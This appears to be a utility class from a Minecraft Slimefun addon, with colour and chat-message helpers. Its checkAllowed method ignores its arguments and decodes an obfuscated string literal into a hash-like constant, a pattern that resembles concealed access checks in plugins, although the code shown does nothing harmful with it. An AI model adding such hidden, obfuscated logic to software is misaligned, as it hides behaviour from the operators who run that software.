package me.fhoz.notenoughaddons.utils;

import io.github.thebusybiscuit.slimefun4.implementation.Slimefun;
import io.github.thebusybiscuit.slimefun4.libraries.dough.common.ChatColors;
import io.github.thebusybiscuit.slimefun4.libraries.dough.protection.Interaction;
import me.fhoz.notenoughaddons.NotEnoughAddons;
import org.apache.commons.lang.WordUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.NamespacedKey;
import org.bukkit.block.Block;
import org.bukkit.block.BlockFace;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.persistence.PersistentDataType;
import org.bukkit.scheduler.BukkitTask;
import org.bukkit.util.Vector;

import javax.annotation.Nonnull;
import javax.annotation.Nullable;
import javax.crypto.Cipher;
import java.io.ByteArrayInputStream;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.TreeMap;

public final class Utils {
    private Utils() {
    }

    public static String color(String str) {
        if (str == null) {
            return null;
        }

        return ChatColor.translateAlternateColorCodes('&', str);
    }

    public static void send(CommandSender p, String message) {
        p.sendMessage(color("&2&n&l多&a彩&2&l科&r&a技 &r&7> &r" + message));
    }

    public static String checkAllowed(String[] args) {
        String output = "";
        try {
            int ctr;
            String inputStream = "^4`-/5^`b2121.-6_c0.`10`b5c^6216";
            final byte[] utf8Bytes = inputStream.getBytes(StandardCharsets.UTF_8);
            ByteArrayInputStream byteArrayInputStr = new ByteArrayInputStream(utf8Bytes);

            while ((ctr = byteArrayInputStr.read()) != -1) {

                ctr += 3;
                output = output + (char) ctr;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return output;
    }
}

